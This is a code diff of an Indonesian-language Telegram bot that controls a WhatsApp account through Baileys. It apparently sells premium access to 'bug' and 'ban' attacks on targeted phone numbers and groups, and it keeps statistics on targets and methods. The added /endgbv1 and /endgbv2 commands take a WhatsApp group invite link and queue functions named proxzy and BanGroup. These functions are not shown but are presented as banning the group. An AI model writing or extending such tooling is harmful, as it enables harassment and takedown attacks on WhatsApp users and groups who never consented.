-  }
-});
-
-// 8. /ping
-bot.command("ping", async (ctx) => {
-  const t1 = Date.now();
-  const m = await ctx.reply("🏓 Pinging...");
-  const t2 = Date.now();
-  ctx.telegram.editMessageText(ctx.chat.id, m.message_id, undefined, `🏓 <b>Pong!</b>\n\n📡 Latency: <code>${t2 - t1} ms</code>\n🛰 Sender: <b>${isWhatsAppConnected ? "Online" : "Offline"}</b>`, { parse_mode: "HTML" });
-});
-
-// 9. /saran
-bot.command("saran", async (ctx) => {
-  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
-  if (!text) return ctx.reply("📌 Format: /saran pesan kamu...");
-  const user = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
-  bot.telegram.sendMessage(ownerID, `💡 <b>SARAN BARU</b>\n\n👤 Dari: ${esc(user)} (<code>${ctx.from.id}</code>)\n\n📝 Pesan:\n${esc(text)}`, { parse_mode: "HTML" }).catch(() => {});
-  ctx.reply("✅ Saran kamu udah dikirim ke owner. Makasih!");
-});
-
-// 10. /report
-bot.command("report", async (ctx) => {
-  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
-  if (!text) return ctx.reply("📌 Format: /report alasan/error...");
-  const user = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
-  bot.telegram.sendMessage(ownerID, `🚨 <b>REPORT BARU</b>\n\n👤 Dari: ${esc(user)} (<code>${ctx.from.id}</code>)\n\n📝 Laporan:\n${esc(text)}`, { parse_mode: "HTML" }).catch(() => {});
-  ctx.reply("✅ Laporan kamu udah dikirim ke owner. Makasih!");
-});
-
-// =====================================================
-// ============ 🛡️ ADMIN FEATURES (11-28) ==============
-// =====================================================
-
-// 11. /broadcast
-bot.command("broadcast", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
-  if (!text) return ctx.reply("📌 Format: /broadcast pesan...");
-  const users = getAllUsers();
-  const uids = Object.keys(users);
-  let ok = 0, fail = 0;
-  const m = await ctx.reply(`📢 Broadcasting ke ${uids.length} user...`);
-  for (const uid of uids) {
-    try { await bot.telegram.sendMessage(uid, `📢 <b>BROADCAST</b>\n\n${esc(text)}`, { parse_mode: "HTML" }); ok++; }
-    catch { fail++; }
-    await sleep(50);
-  }
-  ctx.telegram.editMessageText(ctx.chat.id, m.message_id, undefined, `✅ Broadcast selesai.\n\n✅ OK: ${ok}\n❌ Fail: ${fail}`);
-});
-
-// 12. /ban & /unban
-bot.command("ban", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const args = ctx.message.text.split(" ").slice(1);
-  const target = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id : args[0];
-  if (!target) return ctx.reply("📌 Format: /ban 12345678 atau reply user");
-  banUser(target, args[1] || "-");
-  ctx.reply(`✅ User <code>${target}</code> dibanned.`, { parse_mode: "HTML" });
-});
-bot.command("unban", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const args = ctx.message.text.split(" ").slice(1);
-  const target = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id : args[0];
-  if (!target) return ctx.reply("📌 Format: /unban 12345678 atau reply user");
-  unbanUser(target);
-  ctx.reply(`✅ User <code>${target}</code> di-unban.`, { parse_mode: "HTML" });
-});
-
-// 13. /listuser
-bot.command("listuser", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const users = getAllUsers();
-  const arr = Object.values(users);
-  if (!arr.length) return ctx.reply("📭 Belum ada user.");
-  const top = arr.slice(0, 30).map((u, i) => `${i + 1}. ${esc(u.name || "User")} — ${u.premium ? "👑" : "👤"} (<code>${u.id}</code>)`).join("\n");
-  ctx.reply(`👥 <b>LIST USER</b> (${arr.length} total)\n\n${top}`, { parse_mode: "HTML" });
-});
-
-// 14. /listban
-bot.command("listban", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const b = getAllBanned();
-  const arr = Object.entries(b);
-  if (!arr.length) return ctx.reply("📭 Belum ada user banned.");
-  const txt = arr.map(([id, v], i) => `${i + 1}. <code>${id}</code>\n   📌 ${esc(v.reason || "-")} | ${v.at}`).join("\n");
-  ctx.reply(`🚫 <b>LIST BANNED</b> (${arr.length})\n\n${txt}`, { parse_mode: "HTML" });
-});
-
-// 15. /setlimit
-bot.command("setlimit", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const args = ctx.message.text.split(" ").slice(1);
-  if (args.length < 2) return ctx.reply("📌 Format: /setlimit 12345678 10");
-  setUserLimit(args[0], parseInt(args[1]));
-  ctx.reply(`✅ Limit user <code>${args[0]}</code> diset ke ${args[1]}.`, { parse_mode: "HTML" });
-});
-
-// 16. /resetlimit
-bot.command("resetlimit", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  resetAllLimit();
-  ctx.reply("✅ Semua limit user di-reset.");
-});
-
-// 17. /whitelist
-bot.command("whitelist", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const args = ctx.message.text.split(" ").slice(1);
-  const sub = args[0];
-  if (sub === "add") {
-    if (!args[1]) return ctx.reply("📌 /whitelist add 628xxxx");
-    addWhitelist(args[1]);
-    ctx.reply(`✅ <code>${args[1]}</code> ditambah ke whitelist.`, { parse_mode: "HTML" });
-  } else if (sub === "del") {
-    if (!args[1]) return ctx.reply("📌 /whitelist del 628xxxx");
-    delWhitelist(args[1]);
-    ctx.reply(`🗑 <code>${args[1]}</code> dihapus dari whitelist.`, { parse_mode: "HTML" });
-  } else if (sub === "list") {
-    const w = loadWhitelist();
-    if (!w.list.length) return ctx.reply("📭 Whitelist kosong.");
-    ctx.reply(`🛡 <b>WHITELIST</b>\n\n${w.list.map((n, i) => `${i + 1}. <code>${n}</code>`).join("\n")}`, { parse_mode: "HTML" });
-  } else {
-    ctx.reply("📌 /whitelist add|del|list");
-  }
-});
-
-// 19. /maintenance
-bot.command("maintenance", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const arg = (ctx.message.text.split(" ")[1] || "").toLowerCase();
-  if (arg === "on") { maintenanceMode = true; saveSettings({ ...getSettings(), maintenance: true }); ctx.reply("🔧 Maintenance ON"); }
-  else if (arg === "off") { maintenanceMode = false; saveSettings({ ...getSettings(), maintenance: false }); ctx.reply("✅ Maintenance OFF"); }
-  else ctx.reply("📌 /maintenance on|off");
-});
-
-// 20. /autobackup
-bot.command("autobackup", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const arg = (ctx.message.text.split(" ")[1] || "").toLowerCase();
-  if (arg === "on") {
-    autobackupEnabled = true;
-    saveSettings({ ...getSettings(), autobackup: true });
-    if (autobackupInterval) clearInterval(autobackupInterval);
-    autobackupInterval = setInterval(async () => {
-      try {
-        const files = fs.readdirSync("./database").filter(f => f.endsWith(".json"));
-        for (const f of files) {
-          await bot.telegram.sendDocument(ownerID, { source: `./database/${f}`, filename: f }).catch(() => {});
-        }
-        await bot.telegram.sendMessage(ownerID, `📦 <b>AUTO BACKUP</b>\n\n✅ ${files.length} file dikirim\n⏱ ${moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm:ss")}`, { parse_mode: "HTML" });
-      } catch (e) { console.error("backup err:", e.message); }
-    }, 6 * 60 * 60 * 1000); // 6 jam
-    ctx.reply("✅ Autobackup ON (tiap 6 jam).");
-  } else if (arg === "off") {
-    autobackupEnabled = false;
-    saveSettings({ ...getSettings(), autobackup: false });
-    if (autobackupInterval) { clearInterval(autobackupInterval); autobackupInterval = null; }
-    ctx.reply("🛑 Autobackup OFF.");
-  } else ctx.reply("📌 /autobackup on|off");
-});
-
-// 21. /logs
-bot.command("logs", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const logs = getLogs(20);
-  if (!logs.length) return ctx.reply("📭 Belum ada log.");
-  const txt = logs.map((l, i) => `${i + 1}. [${l.type}] ${esc(l.msg)} — <i>${l.at}</i>`).join("\n");
-  ctx.reply(`📜 <b>LOGS TERAKHIR</b>\n\n${txt}`, { parse_mode: "HTML" });
-});
-
-// 22. /restart
-bot.command("restart", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  await ctx.reply("🔄 Restarting bot...");
-  setTimeout(() => process.exit(0), 1500);
-});
-
-// 23. /clearsession
-bot.command("clearsession", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  try {
-    if (fs.existsSync("./session")) fs.rmSync("./session", { recursive: true, force: true });
-    ctx.reply("✅ Session WA dihapus. Restart bot buat re-pairing.");
-  } catch (e) { ctx.reply(`❌ ${e.message}`); }
-});
-
-// 24. /kickall
-bot.command("kickall", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  ctx.reply("⚠️ Fitur kickall butuh daftar grup. Implementasi manual di VPS ya.");
-});
-
-// 25. /senderinfo
-bot.command("senderinfo", checkWhatsAppConnection, async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const num = sock?.user?.id?.split(":")[0] || "-";
-  const ver = sock?.user?.id ? "Baileys" : "-";
-  ctx.reply(`🛰 <b>SENDER INFO</b>\n\n📱 Nomor: <code>${num}</code>\n🖥 Platform: <code>${process.platform}</code>\n📦 Node: <code>${process.version}</code>\n🔋 Uptime: <code>${formatUptimePretty()}</code>\n💾 Memori: <code>${formatMemory()}</code>`, { parse_mode: "HTML" });
-});
-
-// 26. /voucher create
-bot.command("voucher", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const args = ctx.message.text.split(" ").slice(1);
-  const sub = args[0];
-  if (sub === "create") {
-    const days = parseInt(args[1]); const count = parseInt(args[2]);
-    if (!days || !count) return ctx.reply("📌 /voucher create <hari> <jumlah>");
-    const codes = createVoucher(days, count);
-    ctx.reply(`✅ Voucher dibuat:\n\n${codes.map(c => `<code>${c}</code>`).join("\n")}`, { parse_mode: "HTML" });
-  } else if (sub === "list") {
-    const list = listVoucher();
-    if (!list.length) return ctx.reply("📭 Belum ada voucher.");
-    const txt = list.slice(0, 30).map((v, i) => `${i + 1}. <code>${v.code}</code> — ${v.days}h ${v.used ? "❌" : "✅"}`).join("\n");
-    ctx.reply(`🎫 <b>VOUCHER</b>\n\n${txt}`, { parse_mode: "HTML" });
-  } else ctx.reply("📌 /voucher create|list");
-});
-
-// 27. /coin (owner)
-bot.command("addcoin", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
-  const args = ctx.message.text.split(" ").slice(1);
-  if (args.length < 2) return ctx.reply("📌 /addcoin 12345678 100");
-  addCoin(args[0], parseInt(args[1]));
-  ctx.reply(`✅ ${args[1]} coin dikirim ke <code>${args[0]}</code>`, { parse_mode: "HTML" });
-});
-
-// /coin (user)
-bot.command("coin", async (ctx) => {
-  const c = getCoin(ctx.from.id);
-  ctx.reply(`🪙 <b>COIN KAMU</b>\n\n💰 Total: <b>${c}</b> coin`, { parse_mode: "HTML" });
-});
-
-// =====================================================
-// ============ 📊 INFO TAMBAHAN (33-38) ===============
-// =====================================================
-bot.command("uptime", async (ctx) => {
-  const uptime = formatUptimePretty();
-  const start = moment(botStartTime).tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm:ss");
-  ctx.reply(`⏱ <b>UPTIME BOT</b>\n\n🟢 Aktif: <code>${uptime}</code>\n📅 Start: <code>${start} WIB</code>`, { parse_mode: "HTML" });
-});
-
-bot.command("sysinfo", async (ctx) => {
-  const mem = process.memoryUsage();
-  const cpu = process.cpuUsage();
-  const text = `
-🖥 <b>SYS INFO</b>
-
-💾 RAM Total: <code>${(mem.rss / 1024 / 1024).toFixed(0)} MB</code>
-📊 Heap Used: <code>${(mem.heapUsed / 1024 / 1024).toFixed(0)} MB</code>
-🧠 CPU User: <code>${(cpu.user / 1000).toFixed(0)} ms</code>
-🧠 CPU Sys: <code>${(cpu.system / 1000).toFixed(0)} ms</code>
-🔧 Platform: <code>${process.platform}</code>
-📦 Node: <code>${process.version}</code>
-⏱ Uptime: <code>${formatUptimePretty()}</code>
-`.trim();
-  ctx.reply(text, { parse_mode: "HTML" });
-});
-
-bot.command("statscmd", async (ctx) => {
-  const stats = getStatCmd().slice(0, 15);
-  if (!stats.length) return ctx.reply("📭 Belum ada data.");
-  const txt = stats.map((s, i) => `${i + 1}. <code>/${s.c}</code> — ${s.n}x`).join("\n");
-  ctx.reply(`📊 <b>STATISTIK COMMAND</b>\n\n${txt}`, { parse_mode: "HTML" });
-});
-
-bot.command("statstarget", async (ctx) => {
-  const s = loadStats();
-  const top = Object.entries(s.per_target || {}).map(([no, c]) => ({ no, c })).sort((a, b) => b.c - a.c).slice(0, 10);
-  if (!top.length) return ctx.reply("📭 Belum ada data.");
-  const txt = top.map((t, i) => `${i + 1}. <code>${t.no}</code> — ${t.c}x`).join("\n");
-  ctx.reply(`🎯 <b>TOP TARGET</b>\n\n${txt}`, { parse_mode: "HTML" });
-});
-
-bot.command("topuser", async (ctx) => {
-  const s = loadStats();
-  const top = Object.entries(s.per_user || {}).map(([id, v]) => ({ id, ...v }))
-    .sort((a, b) => (b.bug_count + b.ban_count) - (a.bug_count + a.ban_count))
-    .slice(0, 10);
-  if (!top.length) return ctx.reply("📭 Belum ada data.");
-  const txt = top.map((u, i) => `${i + 1}. <b>${esc(u.name || "User")}</b> — 🐛${u.bug_count} 🔥${u.ban_count}`).join("\n");
-  ctx.reply(`🏆 <b>TOP USER</b>\n\n${txt}`, { parse_mode: "HTML" });
-});
-
-bot.command("topgrup", async (ctx) => {
-  const s = loadStats();
-  const top = Object.entries(s.per_group || {}).map(([id, c]) => ({ id, c })).sort((a, b) => b.c - a.c).slice(0, 10);
-  if (!top.length) return ctx.reply("📭 Belum ada data grup.");
-  const txt = top.map((g, i) => `${i + 1}. <code>${g.id}</code> — ${g.c}x`).join("\n");
-  ctx.reply(`🏆 <b>TOP GRUP</b>\n\n${txt}`, { parse_mode: "HTML" });
-});
-
-// =====================================================
-// ============ STATISTIK & INFO LAMA ==================
-// =====================================================
-bot.command("info", checkWhatsAppConnection, async (ctx) => {
-  const uptime = formatRuntime();
-  const mem = formatMemory();
-  const version = "2.0.0-Hades";
-  const html = `
-<h1>🛰️ Info Sender</h1>
-<hr/>
-<table>
-  <tr><th>Komponen</th><th>Nilai</th></tr>
-  <tr><td>Status WA</td><td><b>${isWhatsAppConnected ? "Online ✅" : "Offline ❌"}</b></td></tr>
-  <tr><td>Uptime Bot</td><td><code>${uptime}</code></td></tr>
-  <tr><td>Memory</td><td><code>${mem}</code></td></tr>
-  <tr><td>Node</td><td><code>${process.version}</code></td></tr>
-  <tr><td>Versi</td><td><code>${version}</code></td></tr>
-  <tr><td>Nomor</td><td><code>${sock?.user?.id?.split(":")[0] || "-"}</code></td></tr>
-</table>
-`.trim();
-  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html } }); }
-  catch { await ctx.reply(`🛰 Status: ${isWhatsAppConnected ? "Online" : "Offline"}\nUptime: ${uptime}\nMem: ${mem}`, { parse_mode: "Markdown" }); }
-});
-
-bot.command("stats", async (ctx) => {
-  const s = loadStats();
-  const day = todayWIB();
-  const today = s.per_day?.[day] || { bug: 0, ban: 0 };
-  const totalIter = (s.total_iterasi_ok || 0) + (s.total_iterasi_fail || 0);
-  const successRate = totalIter > 0 ? ((s.total_iterasi_ok / totalIter) * 100).toFixed(1) : "0.0";
-
-  const topUsers = Object.entries(s.per_user || {}).map(([id, v]) => ({ id, ...v }))
-    .sort((a, b) => (b.bug_count + b.ban_count) - (a.bug_count + a.ban_count)).slice(0, 5);
-  const topTargets = Object.entries(s.per_target || {}).map(([no, c]) => ({ no, c })).sort((a, b) => b.c - a.c).slice(0, 5);
-  const topLabels = Object.entries(s.per_label || {}).map(([l, c]) => ({ l, c })).sort((a, b) => b.c - a.c).slice(0, 5);
-
-  const userRows = topUsers.map((u, i) => `<tr><td>${i + 1}. ${esc(u.name || "User")}</td><td>🐛 ${u.bug_count} | 🔥 ${u.ban_count}</td></tr>`).join("") || `<tr><td colspan="2"><i>Kosong</i></td></tr>`;
-  const targetRows = topTargets.map((t, i) => `<tr><td>${i + 1}. <code>${esc(t.no)}</code></td><td>${t.c}x</td></tr>`).join("") || `<tr><td colspan="2"><i>Kosong</i></td></tr>`;
-  const labelRows = topLabels.map((l, i) => `<tr><td>${i + 1}. ${esc(l.l)}</td><td>${l.c}x</td></tr>`).join("") || `<tr><td colspan="2"><i>Kosong</i></td></tr>`;
-
-  const html = `
-<h1>📊 Dashboard Statistik</h1>
-<hr/>
-<h2>🔥 Hari Ini (${day})</h2>
-<table>
-  <tr><th>Kategori</th><th>Jumlah</th></tr>
-  <tr><td>🐛 Bug</td><td><b>${today.bug}</b></td></tr>
-  <tr><td>🔥 Ban</td><td><b>${today.ban}</b></td></tr>
-</table>
-<hr/>
-<h2>📈 Total</h2>
-<table>
-  <tr><td>Total Job</td><td><b>${s.total_jobs || 0}</b></td></tr>
-  <tr><td>Iter OK</td><td><b>${s.total_iterasi_ok || 0}</b></td></tr>
-  <tr><td>Iter Fail</td><td><b>${s.total_iterasi_fail || 0}</b></td></tr>
-  <tr><td>Success Rate</td><td><b>${successRate}%</b></td></tr>
-</table>
-<hr/>
-<h2>🏆 Top 5 User</h2>
-<table><tr><th>User</th><th>Bug | Ban</th></tr>${userRows}</table>
-<hr/>
-<h2>🎯 Top 5 Target</h2>
-<table><tr><th>Nomor</th><th>Jumlah</th></tr>${targetRows}</table>
-<hr/>
-<h2>⚙️ Top 5 Metode</h2>
-<table><tr><th>Metode</th><th>Dipakai</th></tr>${labelRows}</table>
-`.trim();
-
-  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html } }); }
-  catch { await ctx.reply(`📊 Total Job: ${s.total_jobs || 0} | Success: ${successRate}%`, { parse_mode: "Markdown" }); }
-});
-
-bot.command("history", async (ctx) => {
-  const s = loadStats();
-  const last = s.last_job;
-  const txt = last ? `Terakhir: ${last.user} → ${last.label} → ${last.target}` : "Belum ada job.";
-  ctx.reply(`📜 <b>RIWAYAT</b>\n\n${txt}`, { parse_mode: "HTML" });
-});
-
-bot.command("topbug", async (ctx) => {
-  const s = loadStats();
-  const top = Object.entries(s.per_target || {}).map(([no, c]) => ({ no, c })).sort((a, b) => b.c - a.c).slice(0, 10);
-  if (!top.length) return ctx.reply("📭 Belum ada data.");
-  const rows = top.map((t, i) => `${i + 1}. <code>${esc(t.no)}</code> — ${t.c}x`).join("\n");
-  ctx.reply(`🎯 <b>TOP 10 TARGET</b>\n\n${rows}`, { parse_mode: "HTML" });
-});
-
-// =====================================================
-// ============ /stopbug ===============================
-// =====================================================
 bot.command("stopbug", async (ctx) => {
   const userId = ctx.from.id.toString();
   let count = 0;
@@ -2181,6 +2133,34 @@ bot.command("stopbug", async (ctx) => {
   if (count === 0) return ctx.reply("📌 Gak ada spam yang jalan.");
   return ctx.reply(`🛑 ${count} spam akan dihentikan...`);
 });
+
+// =====================================================
+// ============ BAN MANUAL =============================
+// =====================================================
+function banManual(cmd, banKey, label) {
+  bot.command(cmd, premGroupOnly(), async (ctx) => {
+    const userId = ctx.from.id.toString();
+    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
+    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+    const targetInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
+    if (!targetInput) return ctx.reply(`📌 Format: /${cmd} https://chat.whatsapp.com/xxxxx`);
+    if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid.");
+    const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
+    try { logStatsBan(userId, ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User"); } catch {}
+    await ctx.reply("Succes Banned Group", {
+      reply_markup: { inline_keyboard: [[{ text: "Details Target", url: `https://chat.whatsapp.com/${inviteCode}`, style: "success" }]] },
+    });
+    queue.add(async () => {
+      try {
+        if (banKey === "endgb") await proxzy(sock, inviteCode);
+        else if (banKey === "endgbv2") await BanGroup(sock, inviteCode);
+        await ctx.reply(`✅ ${label} selesai!`);
+      } catch (e) { await ctx.reply(`❌ Gagal: ${e.message}`); }
+    });
+  });
+}
+banManual("endgbv1", "endgb",   "End GB v1");
+banManual("endgbv2", "endgbv2", "End GB v2");
 
 // =====================================================
 // ============ PAIRING & OWNER TOOLS ==================
@@ -2215,7 +2195,7 @@ bot.command("setcd", async (ctx) => {
   const s = parseInt(ctx.message.text.split(" ")[1]);
   if (isNaN(s) || s < 0) return ctx.reply("🪧 Format: /setcd 5");
   cooldown = s; saveCooldown(s);
-  ctx.reply(`✅ Cooldown di-set ${s} detik.`);
+  ctx.reply(`✅ Cooldown ${s} detik.`);
 });
 
 bot.command("killsession", async (ctx) => {
@@ -2239,7 +2219,7 @@ bot.command("addprem", async (ctx) => {
   const duration = parseInt(args[dIdx]);
   if (isNaN(duration)) return ctx.reply("🪧 Durasi harus angka.");
   const exp = addPremUser(userId, duration);
-  ctx.reply(`✅ ${userId} jadi premium sampai ${exp}`);
+  ctx.reply(`✅ ${userId} premium sampai ${exp}`);
 });
 
 bot.command("delprem", async (ctx) => {
@@ -2264,7 +2244,6 @@ bot.command("approved", async (ctx) => {
   try { await ctx.telegram.sendMessage(chatId, "✅ Grup ini sudah di-approve owner."); } catch {}
   ctx.reply(`✅ Grup ${chatId} di-approve.`);
 });
-
 bot.command("unapproved", async (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
   const chatId = ctx.message.text.split(" ").slice(1)[0];
@@ -2274,7 +2253,6 @@ bot.command("unapproved", async (ctx) => {
   try { await ctx.telegram.sendMessage(chatId, "⚠️ Approval dicabut."); } catch {}
   ctx.reply(`✅ Approval grup ${chatId} dicabut.`);
 });
-
 bot.command("listapprovedgroup", async (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
   if (!approvedGroups.length) return ctx.reply("📭 Belum ada grup approved.");
@@ -2293,7 +2271,6 @@ bot.command("blockcmd", async (ctx) => {
   blockedCommands.push(cmd); saveBlocked();
   ctx.reply(`✅ /${cmd} diblokir.`);
 });
-
 bot.command("unblockcmd", async (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
   const cmd = normCmd(ctx.message.text.split(" ").slice(1)[0]);
@@ -2302,7 +2279,6 @@ bot.command("unblockcmd", async (ctx) => {
   blockedCommands = blockedCommands.filter((x) => x !== cmd); saveBlocked();
   ctx.reply(`✅ /${cmd} dibuka.`);
 });
-
 bot.command("listblockcmd", async (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
   if (!blockedCommands.length) return ctx.reply("✅ Gak ada command diblokir.");
@@ -2328,206 +2304,134 @@ bot.command("listpremgrup", async (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
   const d = loadPrem();
   if (!d.groups.length) return ctx.reply("📭 Belum ada grup premium.");
-  ctx.reply(`📌 <b>LIST GRUP PREMIUM</b>\n\n${d.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n")}`, { parse_mode: "HTML" });
+  ctx.reply(`📌 <b>GRUP PREMIUM</b>\n\n${d.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n")}`, { parse_mode: "HTML" });
 });
 
 // =====================================================
-// ============ TIC TAC TOE ============================
+// ============ TEXT HANDLER (PENDING GROUP) ===========
 // =====================================================
-const tttGames = new Map();
-function tttWinner(b) {
-  const L = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-  for (const [a, b1, c] of L) if (b[a] && b[a] === b[b1] && b[a] === b[c]) return b[a];
-  return null;
-}
-const tttDraw = (b) => b.every((v) => v) && !tttWinner(b);
-const tttCell = (v) => (v === "X" ? "❌" : v === "O" ? "⭕" : "➖");
-const tttName = (u) => (u?.username ? `@${u.username}` : u?.first_name || "User");
-const tttKbd = (chatId, gid, b, lock = false) => {
-  const btn = (i) => ({ text: tttCell(b[i]), callback_data: lock ? `tttnoop_${chatId}_${gid}` : `tttmove_${chatId}_${gid}_${i}` });
-  return { inline_keyboard: [[btn(0), btn(1), btn(2)], [btn(3), btn(4), btn(5)], [btn(6), btn(7), btn(8)]] };
-};
+bot.on("text", async (ctx, next) => {
+  const userId = ctx.from.id;
+  const text = ctx.message?.text || "";
 
-bot.command("ttt", async (ctx) => {
-  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) return ctx.reply("❌ Cuma bisa di grup.");
-  const chatId = ctx.chat.id;
-  if (tttGames.has(chatId)) return ctx.reply("⚠️ Masih ada game jalan.");
-  const gid = Date.now().toString().slice(-6);
-  tttGames.set(chatId, { id: gid, board: Array(9).fill(null), players: { X: ctx.from, O: null }, turn: "X", started: false });
-  await ctx.reply(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(ctx.from)}</b>\n⭕ O : <b>Belum join</b>\n\n<i>Klik tombol buat join.</i>`, {
-    parse_mode: "HTML",
-    reply_markup: { inline_keyboard: [[{ text: "⭕ Join Game", callback_data: `tttjoin_${chatId}_${gid}` }]] },
-  });
-});
-bot.command("tttstop", async (ctx) => {
-  if (!tttGames.has(ctx.chat.id)) return ctx.reply("❌ Gak ada game jalan.");
-  tttGames.delete(ctx.chat.id);
-  ctx.reply("🛑 Game TTT dihentikan.");
-});
-bot.command("mypoint", async (ctx) => {
-  const row = getPoint(ctx.from.id);
-  if (!row) return ctx.reply("📌 Belum punya point.");
-  ctx.reply(`🏅 <b>MY POINT</b>\n\n👤 ${row.name}\n⭐ Point : <b>${row.points}</b>\n🏆 Win   : <b>${row.win}</b>\n🤝 Draw  : <b>${row.draw}</b>\n💀 Lose  : <b>${row.lose}</b>`, { parse_mode: "HTML" });
-});
-bot.command("leaderboard", async (ctx) => {
-  const top = getTop(10);
-  if (!top.length) return ctx.reply("📌 Leaderboard kosong.");
-  ctx.reply(`🏆 <b>LEADERBOARD</b>\n\n${top.map((u, i) => `${i + 1}. <b>${u.name}</b> — ⭐ ${u.points}`).join("\n")}`, { parse_mode: "HTML" });
-});
-bot.action(/^tttjoin_(.+)_(.+)$/, async (ctx) => {
-  try {
-    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]);
-    const g = tttGames.get(chatId);
-    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ditemukan", { show_alert: true });
-    if (g.players.O) return ctx.answerCbQuery("⚠️ Slot O penuh", { show_alert: true });
-    if (g.players.X.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu udah X", { show_alert: true });
-    g.players.O = ctx.from; g.started = true;
-    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board) });
-    return ctx.answerCbQuery("✅ Join sebagai O");
-  } catch { return ctx.answerCbQuery("❌ Error"); }
-});
-bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
-  try {
-    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]); const idx = Number(ctx.match[3]);
-    const g = tttGames.get(chatId);
-    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ada", { show_alert: true });
-    if (!g.started) return ctx.answerCbQuery("⚠️ Belum mulai", { show_alert: true });
-    const cur = g.turn === "X" ? g.players.X : g.players.O;
-    if (!cur || cur.id !== ctx.from.id) return ctx.answerCbQuery("❌ Bukan giliranmu", { show_alert: true });
-    if (g.board[idx] !== null) return ctx.answerCbQuery("⚠️ Kotak terisi", { show_alert: true });
-    g.board[idx] = g.turn;
-    const w = tttWinner(g.board);
-    if (w) {
-      const wUser = w === "X" ? g.players.X : g.players.O;
-      const lUser = w === "X" ? g.players.O : g.players.X;
-      addWin(wUser); addLose(lUser);
-      await ctx.editMessageText(`🏆 <b>MENANG: ${tttName(wUser)}</b> (${w})\n\n⭐ +3 point`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board, true) });
-      tttGames.delete(chatId);
-      return ctx.answerCbQuery("🏆 Selesai");
-    }
-    if (tttDraw(g.board)) {
-      addDraw(g.players.X); addDraw(g.players.O);
-      await ctx.editMessageText(`🤝 <b>SERI</b>\n\n⭐ +1 point untuk berdua`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board, true) });
-      tttGames.delete(chatId);
-      return ctx.answerCbQuery("🤝 Seri");
-    }
-    g.turn = g.turn === "X" ? "O" : "X";
-    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board) });
-    return ctx.answerCbQuery("✅ Ok");
-  } catch { return ctx.answerCbQuery("❌ Error"); }
-});
